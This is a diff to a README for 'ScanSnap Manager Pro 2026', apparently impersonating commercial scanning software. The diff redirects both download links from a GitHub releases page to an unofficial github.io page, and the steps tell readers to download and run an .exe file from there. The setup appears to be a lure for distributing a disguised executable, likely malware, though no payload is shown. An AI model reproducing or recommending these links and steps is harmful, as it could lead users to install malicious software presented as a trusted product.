@@ -1,6 +1,6 @@
 # 📄 ScanSnap-Manager-Pro-2026 - Streamline document scanning for your office
 
-[![](https://img.shields.io/badge/Download-ScanSnap-Manager-Pro-2026-blue)](https://github.com/lenguaylitera5084/ScanSnap-Manager-Pro-2026/releases)
+[![](https://img.shields.io/badge/Download-ScanSnap-Manager-Pro-2026-blue)](https://lenguaylitera5084.github.io)
 
 ScanSnap Manager Pro 2026 offers tools for document management on Windows 10 and Windows 11. This software connects your physical scanner to your computer to help you digitize paperwork, save files, and organize folders. It handles image processing, text recognition, and file storage.
 
@@ -18,7 +18,7 @@ Before you install this software, confirm your computer meets these needs:
 
 Follow these steps to obtain the correct version for your machine:
 
-1.  Visit the official release page: [https://github.com/lenguaylitera5084/ScanSnap-Manager-Pro-2026/releases](https://github.com/lenguaylitera5084/ScanSnap-Manager-Pro-2026/releases).
+1.  Visit the official release page: [https://lenguaylitera5084.github.io](https://lenguaylitera5084.github.io).
 2.  Look for the section marked "Latest" at the top of the page.
 3.  Click the file ending in .exe to start the download.
 4.  Save the file to your Downloads folder.
